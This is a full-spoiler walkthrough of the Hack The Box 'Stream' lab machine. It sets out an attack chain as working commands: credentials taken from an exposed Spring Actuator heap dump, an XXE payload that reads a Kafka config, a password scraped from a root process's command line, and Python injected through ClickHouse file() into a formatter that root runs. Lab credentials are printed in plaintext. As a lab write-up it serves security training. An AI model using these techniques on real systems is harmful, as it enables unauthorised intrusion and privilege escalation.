# Stream - HTB Linux Medium

> Full spoiler. This write-up is for the authorized HTB Stream machine only. Replace `10.129.x.x` locally with the target IP assigned to your own session; the published file intentionally does not contain a full target IP. Never use these credentials or techniques outside the lab.

## Summary

The initial foothold comes from an exposed Spring Actuator heap dump on `api.htb-airport.htb`. It contains the ClickHouse `svc_events` credentials. ClickHouse exposes the raw and parsed AIDX Kafka pipeline, so a crafted XML external entity (XXE) message can read Kafka's `server.properties` and reveal the SSH password for `svc-infra`.

As `svc-infra`, malformed AIDX messages are sent to Kafka's dead-letter queue. A root systemd timer runs a DLQ drainer that invokes a Python formatter. The drainer's `clickhouse-client` command exposes the ClickHouse `default` password in `/proc/<pid>/cmdline`. That ClickHouse account can write to its `user_files` directory using `file()`. Appending Python to the formatter results in root code execution on the next drainer run.

## 1. Set up the target hostnames

Set the target IP assigned by HTB in a local shell. The value shown here is deliberately redacted for publication.

```bash
export TARGET=10.129.x.x
printf '%s\n' "$TARGET api.htb-airport.htb db.htb-airport.htb" | sudo tee -a /etc/hosts
```

Confirm the exposed services and the virtual host redirect:

```bash
nmap -Pn -sC -sV --top-ports 1000 "$TARGET"
curl -i "http://$TARGET/"
curl -i --resolve "api.htb-airport.htb:80:$TARGET" http://api.htb-airport.htb/
```

The relevant services are SSH, nginx, and the AIDX ingest API on port `8081`. The root web service redirects to `api.htb-airport.htb`.

## 2. Download and inspect the Java heap dump

The Actuator index advertises a heap dump endpoint:

```bash
curl -sS --resolve "api.htb-airport.htb:80:$TARGET" \
  http://api.htb-airport.htb/actuator
curl -sSI --resolve "api.htb-airport.htb:80:$TARGET" \
  http://api.htb-airport.htb/actuator/heapdump
```

Download the roughly 50 MB dump and search it for the ClickHouse credential:

```bash
curl -sS --fail --resolve "api.htb-airport.htb:80:$TARGET" \
  http://api.htb-airport.htb/actuator/heapdump -o /tmp/stream-heapdump.hprof
strings -a /tmp/stream-heapdump.hprof | grep -n -B 8 -A 12 -i svc_events
```

The heap contains a Hikari datasource configuration for the `svc_events` account. The credentials recovered from that configuration are:

```text
username: svc_events
password: Yl4aCgh4y2PnU
```

The exposed database virtual host is ClickHouse:

```bash
curl -sS --user 'svc_events:Yl4aCgh4y2PnU' \
  --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SELECT version(), currentUser() FORMAT TSV' \
  http://db.htb-airport.htb/
```

## 3. Map the AIDX Kafka pipeline in ClickHouse

List the database and its tables, then inspect the Kafka source and materialized views:

```bash
CH_USER='svc_events'
CH_PASS='Yl4aCgh4y2PnU'
DB_URL='http://db.htb-airport.htb/'

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SHOW DATABASES FORMAT TSV' "$DB_URL"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SHOW TABLES FROM partner_feed FORMAT TSV' "$DB_URL"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SHOW CREATE TABLE partner_feed.flightleg_raw_kafka FORMAT TSVRaw' "$DB_URL"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SHOW CREATE TABLE partner_feed.flightleg_json_kafka FORMAT TSVRaw' "$DB_URL"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SHOW CREATE TABLE partner_feed.flightleg_json_mv FORMAT TSVRaw' "$DB_URL"
```

The raw topic is `aidx.flightleg.raw.v1`. The parser consumes it, validates XML, and publishes accepted messages to `aidx.flightleg.json.v1`; the ClickHouse Kafka tables/materialized views make both streams queryable.

## 4. Use XXE to read Kafka's configuration

The ingest endpoint accepts AIDX XML and returns `202 Accepted`; actual XML parsing happens asynchronously in the parser worker. Put an external entity in an element the parser preserves in the JSON event. Here it is the `Airline` element. The entity reads Kafka's configuration file:

```bash
cat > /tmp/xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
]>
<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00"
    Version="21.3" EchoToken="xxe-stream">
  <Originator Code="HTB-XXE" Type="1"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline>&xxe;</Airline>
      <FlightNumber>990021</FlightNumber>
      <DepartureAirport>JFK</DepartureAirport>
      <ArrivalAirport>LAX</ArrivalAirport>
      <OriginDate>2026-10-11</OriginDate>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
XML

curl -i --max-time 10 -X POST "http://$TARGET:8081/feeds/aidx" \
  -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml
```

The API response only confirms that the event entered Kafka. Query the parsed ClickHouse table to retrieve the expanded entity value:

```bash
curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode \
  "query=SELECT flight_number, airline FROM partner_feed.flightleg_json WHERE flight_number='990021' ORDER BY ingested DESC LIMIT 1 FORMAT Vertical" \
  "$DB_URL"
```

The `airline` field contains the contents of `server.properties`, including this SASL account:

```text
username: svc-infra
password: Ny2hdpme$bwT3
```

## 5. SSH as `svc-infra`

```bash
ssh svc-infra@"$TARGET"
```

Use the recovered password when prompted. For non-interactive commands, `sshpass` can read the password from an environment variable instead of putting it in the command arguments:

```bash
export SSHPASS='Ny2hdpme$bwT3'
sshpass -e ssh -o StrictHostKeyChecking=accept-new \
  svc-infra@"$TARGET" 'id; whoami; hostname'
```

The foothold is `svc-infra`. The user flag is under `/home/martin_cole/user.txt`, which is not readable by this account yet. `sudo -n -l` does not grant direct sudo access.

## 6. Trigger the root DLQ drainer

Inspect the parser and systemd configuration as `svc-infra`:

```bash
sed -n '1,240p' /opt/aidx-pipeline/app/parser_worker.py
sed -n '1,180p' /opt/aidx-pipeline/app/aidx_common.py
systemctl cat aidx-dlq-drainer.service aidx-dlq-drainer.timer
```

The parser sends malformed XML to `aidx.flightleg.dlq.v1`. The enabled timer starts `/opt/ops/dlq_drainer.py` as root every two minutes. The drainer invokes a Python formatter at:

```text
/var/lib/clickhouse/user_files/aidx_quarantine.py
```

It also executes `clickhouse-client` with the ClickHouse password passed as a process argument. Submit a deliberately truncated AIDX message that passes the ingest API's basic required-element check but fails XML parsing:

```bash
cat > /tmp/bad.xml <<'XML'
<?xml version="1.0"?>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator Code="HTB-TRIGGER"/>
  <FlightLeg><LegIdentifier><FlightNumber>990022</FlightNumber></LegIdentifier>
XML

curl -i --max-time 10 -X POST "http://$TARGET:8081/feeds/aidx" \
  -H 'Content-Type: application/xml' --data-binary @/tmp/bad.xml
```

Wait for the next timer run, then capture the short-lived `clickhouse-client` command line from `/proc`:

```bash
for proc in /proc/[0-9]*; do
  cmd=$(tr '\0' ' ' < "$proc/cmdline" 2>/dev/null) || continue
  case "$cmd" in
    *clickhouse-client*--user\ default*) printf '%s\n' "$cmd" ;;
  esac
done
```

The observed command contains:

```text
--user default --password N3v3rs33nD4T4
```

The `svc-infra` user cannot read `/etc/partner-sync/ch.pw`, but the password is exposed in the root process command line when the drainer runs.

## 7. Write a Python formatter through ClickHouse

Verify the `default` account and the ClickHouse file function:

```bash
CH_USER='default'
CH_PASS='N3v3rs33nD4T4'

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode 'query=SELECT version(), currentUser() FORMAT TSV' "$DB_URL"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode "query=SELECT file('aidx_quarantine.py','RawBLOB') FORMAT RawBLOB" "$DB_URL"
```

The formatter is executed by Python as root for every DLQ message. The following payload copies both flags to a temporary file readable by `svc-infra`:

```bash
PY_PAYLOAD="import pathlib,os;pathlib.Path('/tmp/stream_flags').write_text(pathlib.Path('/home/martin_cole/user.txt').read_text().strip()+chr(10)+pathlib.Path('/root/root.txt').read_text().strip());os.chmod('/tmp/stream_flags',0o644)"
PAYLOAD_B64=$(printf '%s' "$PY_PAYLOAD" | base64 -w0)
SQL="INSERT INTO FUNCTION file('aidx_quarantine.py','RawBLOB') SELECT base64Decode('$PAYLOAD_B64')"

curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode "query=$SQL" "$DB_URL"
```

On this target, `file()` appends data to the existing formatter by default. The original script ends by calling `main()`, so appended Python code is still run by the root formatter process.

Send another malformed message **after** writing the payload, then wait for the next two-minute timer run:

```bash
curl -i --max-time 10 -X POST "http://$TARGET:8081/feeds/aidx" \
  -H 'Content-Type: application/xml' \
  --data-binary @/tmp/bad.xml

# Check periodically; the drainer runs from its systemd timer.
ssh svc-infra@"$TARGET" 'while [ ! -s /tmp/stream_flags ]; do sleep 2; done; cat /tmp/stream_flags'
```

The captured flags were:

```text
user.txt: b80dc664658b0d8f02554714f7xxxxxx
root.txt: d51bf6c8be1bca90f66ad1dfcbxxxxxx
```

## 8. Restore the formatter

Before changing the formatter, preserve its original contents by reading it through ClickHouse. If a payload has already been appended, extract the original prefix before the appended marker. Then overwrite the file with ClickHouse's file-engine truncation setting:

```bash
# Save the original formatter first; example command when it has not yet been modified:
curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode "query=SELECT file('aidx_quarantine.py','RawBLOB') FORMAT RawBLOB" \
  "$DB_URL" -o /tmp/aidx_quarantine.original

ORIGINAL_B64=$(base64 -w0 /tmp/aidx_quarantine.original)
RESTORE_SQL="INSERT INTO FUNCTION file('aidx_quarantine.py','RawBLOB') SETTINGS engine_file_truncate_on_insert=1 SELECT base64Decode('$ORIGINAL_B64')"
curl -sS --user "$CH_USER:$CH_PASS" --resolve "db.htb-airport.htb:80:$TARGET" \
  --get --data-urlencode "query=$RESTORE_SQL" "$DB_URL"
```

Verify the restored file by reading it back and comparing with the saved copy. The `engine_file_truncate_on_insert=1` setting is important: the default behavior appends instead of replacing. The temporary flag output is root-owned, so `svc-infra` cannot remove it from `/tmp`; it can be removed as part of a final one-shot root formatter cleanup, or left until the lab instance is reset.

## Findings

- Exposed Spring Actuator heap dump leaked the `svc_events` ClickHouse password.
- AIDX parser enabled DTD loading, entity resolution, and network access, allowing XXE file disclosure.
- Kafka configuration disclosed the `svc-infra` SASL password.
- A root systemd DLQ drainer exposed its ClickHouse password in process arguments.
- ClickHouse `default` could write into the formatter's `user_files` directory with `file()`.
- Root executed the writable formatter on each DLQ event, yielding root-level file read.
